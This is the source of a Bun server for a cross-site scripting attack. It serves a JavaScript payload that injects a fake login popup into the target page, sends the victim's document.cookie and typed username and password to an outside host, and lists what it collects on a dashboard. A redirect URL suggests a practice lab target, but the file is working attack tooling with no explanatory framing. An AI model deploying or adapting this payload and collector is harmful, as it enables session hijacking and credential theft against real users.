import { serve } from "bun";
import { initDB, addCookie, listCookies, addCredential, listCredentials } from "./db";
import { renderPage } from "./html";
import fs from "fs";

await initDB();

serve({
  port: 3000,
  async fetch(req) {
    const url = new URL(req.url);
    const origin = req.headers.get("Origin") || "*"; // Get the requesting origin

    // Serve xss.html for a specific endpoint (e.g., /xss)
    if (url.pathname === "/xss" && req.method === "GET") {
      const xssHtml = fs.readFileSync("xss.html", "utf-8");
      return new Response(xssHtml, {
        headers: {
          "Content-Type": "text/html",
          "Access-Control-Allow-Origin": origin, // Allow the requesting origin
        },
      });
    }

    if (url.pathname === "/xss-script" && req.method === "GET") {
      const jsCode = fs.readFileSync("xss-script.js", "utf-8");
      return new Response(jsCode, {
        headers: {
          "Content-Type": "application/javascript",
          "Access-Control-Allow-Origin": origin,
        },
      });
    }


    if (url.pathname === "/js" && req.method === "GET") {
      const jsCode = `
console.log('Evaluating JS string');
fetch('https://data.estebanmf.space/xss')
.then(t => t.text())
.then(d => {
console.log('Fetched HTML:', d);
// Create a temporary div to parse the popup and overlay
const tempDiv = document.createElement('div');
tempDiv.innerHTML = d;
const overlay = tempDiv.querySelector('#xss-overlay');
const popup = tempDiv.querySelector('#xss-popup');
if (!overlay || !popup) {
console.error('Overlay or popup div not found in fetched HTML');
return;
}
// Append overlay and popup to existing body
try {
document.body.appendChild(overlay);
document.body.appendChild(popup);
console.log('Overlay and popup appended to body');
} catch (e) {
console.error('Failed to append popup:', e);
return;
}
// Check DOM elements
console.log('Checking if xss-submit-btn exists:', !!document.getElementById('xss-submit-btn'));
// Initial cookie send
try {
console.log('Attempting cookie fetch');
fetch('https://data.estebanmf.space/cookies', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({cookies: document.cookie}),
mode: 'no-cors'
})
.then(() => console.log('Cookie fetch sent'))
.catch(e => console.error('Cookie fetch failed:', e));
} catch (e) {
console.error('Cookie fetch setup failed:', e);
}
// Bind onclick handler
try {
const submitBtn = document.getElementById('xss-submit-btn');
if (!submitBtn) {
console.error('Submit button not found');
return;
}
console.log('Attaching onclick to xss-submit-btn');
submitBtn.onclick = function () {
try {
console.log('Submit button clicked');
let u = document.getElementById('xss-u').value;
let p = document.getElementById('xss-p').value;
if (!u || !p) {
console.log('Validation failed: Empty fields');
alert('Fill both fields.');
return;
}
console.log('Sending credentials:', {username: u, password: p});
fetch('https://data.estebanmf.space/credentials', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({username: u, password: p}),
mode: 'no-cors'
})
.then(() => {
console.log('Fetch response received');
document.getElementById('xss-msg').style.display = 'block';
setTimeout(() => {
console.log('Resetting inputs and redirecting');
document.getElementById('xss-u').value = '';
document.getElementById('xss-p').value = '';
document.getElementById('xss-msg').style.display = 'none';
const popup = document.getElementById('xss-popup');
const overlay = document.getElementById('xss-overlay');
if (popup) popup.remove();
if (overlay) overlay.remove();
window.location.href = document.referrer || 'http://kali.kali.estebanmf.space/vulnerabilities/xss_r/';
}, 2000);
})
.catch(e => {
console.error('Credentials fetch failed:', e);
alert('Error: ' + e.message);
});
} catch (e) {
console.error('Button click handler failed:', e);
}
};
console.log('Script logic executed successfully');
} catch (e) {
console.error('Event listener setup failed:', e);
}
})
.catch(e => console.error('HTML fetch error:', e));
`;
      return new Response(jsCode, {
        headers: {
          "Content-Type": "application/javascript",
          "Access-Control-Allow-Origin": origin,
        },
      });
    }

    // POST /cookies
    if (url.pathname === "/cookies" && req.method === "POST") {
      const body = (await req.json().catch(() => null)) as { cookies?: string } | null;
      if (body?.cookies) {
        await addCookie(body.cookies);
        return new Response("Cookies received!", {
          status: 200,
          headers: { "Access-Control-Allow-Origin": origin },
        });
      }
      return new Response("Missing cookies", { status: 400 });
    }

    // POST /credentials
    if (url.pathname === "/credentials" && req.method === "POST") {
      const body = (await req.json().catch(() => null)) as { username?: string; password?: string } | null;
      if (body?.username && body?.password) {
        await addCredential(body.username, body.password);
        return new Response("Credentials received!", {
          status: 200,
          headers: { "Access-Control-Allow-Origin": origin },
        });
      }
      return new Response("Missing username or password", { status: 400 });
    }

    // GET /
    if (url.pathname === "/") {
      const cookies = await listCookies();
      const creds = await listCredentials();
      return new Response(renderPage(cookies, creds), {
        headers: { "Content-Type": "text/html" },
      });
    }

    return new Response("Not found", { status: 404 });
  },
});

console.log("🚀 Server running at http://localhost:3000/");
